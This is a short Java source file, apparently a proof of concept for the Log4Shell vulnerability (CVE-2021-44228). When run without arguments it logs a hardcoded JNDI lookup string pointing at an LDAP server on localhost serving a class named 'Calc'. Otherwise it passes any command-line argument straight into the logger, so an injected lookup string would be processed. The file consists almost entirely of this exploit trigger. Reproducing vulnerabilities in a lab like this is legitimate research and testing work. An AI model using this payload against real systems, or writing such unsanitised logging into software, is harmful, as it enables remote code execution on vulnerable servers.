import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) throws InterruptedException {
        if (args.length == 0) {
            logger.error("${jndi:ldap://127.0.0.1:3890/Calc}");
            return;
        }
        System.out.println(args[0]);
        logger.error(args[0]);
    }
}
